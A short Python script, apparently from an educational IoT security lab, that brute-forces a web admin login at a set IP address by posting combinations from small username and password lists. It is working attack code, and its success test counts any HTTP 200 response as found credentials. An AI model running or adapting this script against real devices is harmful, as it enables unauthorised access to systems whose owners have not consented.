"""
HTTP Web Login Brute Force Attack — Educational Simulation
==========================================================
Goal: Demonstrate credential-stuffing against a web-based IoT device admin panel.

This is a SIMULATION for the local education lab only.
Target: A hypothetical ESP32/IoT web interface at http://<DEVICE_IP>/login

Usage:
    python attacks/http_bruteforce_attack.py
"""

import time
import requests

# --- CONFIGURATION ---
TARGET_IP = "192.168.1.100"   # Change to target device IP
URL = f"http://{TARGET_IP}/login"

# Wordlists (expand for a more realistic simulation)
USERNAMES = ["admin", "user", "iot", "test"]
PASSWORDS = ["1234", "admin", "password", "iot123", "123456"]

REQUEST_DELAY = 0.5  # seconds between attempts (avoid overwhelming device)

# --- ATTACK ---
print(f"[HTTP-BF] Starting brute force against {URL}")
print(f"[HTTP-BF] Combinations to try: {len(USERNAMES) * len(PASSWORDS)}")
print("-" * 50)

found = False
attempts = 0

for user in USERNAMES:
    if found:
        break
    for pwd in PASSWORDS:
        attempts += 1
        data = {"username": user, "password": pwd}

        try:
            response = requests.post(URL, data=data, timeout=3)
            print(f"[{attempts:03d}] Trying {user}:{pwd} -> HTTP {response.status_code}")

            if "success" in response.text.lower() or response.status_code == 200:
                print(f"\n[SUCCESS] Credentials found: {user} / {pwd}")
                found = True
                break

        except requests.exceptions.ConnectionError:
            print(f"[{attempts:03d}] {user}:{pwd} -> Connection refused (device offline?)")
        except Exception as e:
            print(f"Error: {e}")

        time.sleep(REQUEST_DELAY)

if not found:
    print("\n[RESULT] No valid credentials found in wordlist.")

print(f"\n[SUMMARY] Total attempts: {attempts}")
